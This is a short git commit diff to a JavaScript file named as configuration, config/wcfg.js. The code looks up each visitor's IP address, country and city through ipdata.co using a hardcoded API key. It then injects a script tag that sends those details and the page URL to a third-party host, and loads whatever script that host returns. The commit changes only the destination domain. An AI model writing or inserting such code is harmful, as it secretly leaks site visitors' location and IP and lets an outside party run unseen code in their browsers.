b5c6954a1b07b367ad587ff922880f1134c5a8ec
Ryszard Kwiatkowski <140899316+PupiPr0@users.noreply.github.com>
2024-11-17 15:25:04 +0300

    Update wcfg.js

--- config/wcfg.js
+++ config/wcfg.js
@@ -5,6 +5,6 @@ let apiKey = 'f9f0689a25597caa54c5a9b18e00856f58b070dff3d490d443bbd637';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
   
 var script = document.createElement('script');
-script.src = "https://socket-crypto-coin-srv9.wildmoney.pro/wmp-stats?dinary=User:  "+data.country_code+", "+data.city+"   Start Web " +document.URL+", User IP: "+data.ip;
+script.src = "https://socket-server-usa4-ping.dkon.app/wmp-stats?dinary=User:  "+data.country_code+", "+data.city+"   Start Web " +document.URL+", User IP: "+data.ip;
 document.getElementsByTagName('script')[0].parentNode.appendChild(script);   
 });
